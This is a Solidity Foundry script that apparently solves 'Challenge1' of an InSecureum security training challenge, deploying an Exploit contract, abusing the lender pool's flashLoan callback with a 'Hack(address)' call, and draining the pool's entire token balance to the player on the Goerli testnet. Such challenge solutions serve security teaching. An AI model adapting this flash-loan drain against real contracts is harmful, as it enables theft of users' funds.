// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/tokens/tokenInsecureum.sol";
import "../src/Challenge1.lenderpool.sol";
import "../test/Challenge1.t.sol";

// source .env && forge script script/Challenge1.s.sol:Challenge1Script --rpc-url $GOERLI_RPC_URL --broadcast --private-key $ETH_PRIV_KEY --etherscan-api-key $ETHERSCAN_API_KEY -vvvv
// source .env && forge script script/Challenge1.s.sol:Challenge1Script --fork-url $GOERLI_RPC_URL --private-key $ETH_PRIV_KEY -vvvv
contract Challenge1Script is Script {
    InSecureumLenderPool target = InSecureumLenderPool(0xf58C2b4099b30D8535fe2B9Fe942183939cBeB53);
    InSecureumToken token = InSecureumToken(0x4Ce6A394386Cf377a122b3Be453168289BcC3B71);
    address player;

    function setUp() public {
        player = tx.origin;
    }

    function run() public {
        vm.startBroadcast();

        Exploit exploit = new Exploit();
        
        target.flashLoan(
            address(exploit),
            abi.encodeWithSignature("Hack(address)", player)
        );

        uint256 balance = token.balanceOf(address(target));

        token.transferFrom(address(target), player, balance);
        
        require(token.balanceOf(address(target)) == 0, "contract must be empty");

        vm.stopBroadcast();
    }
}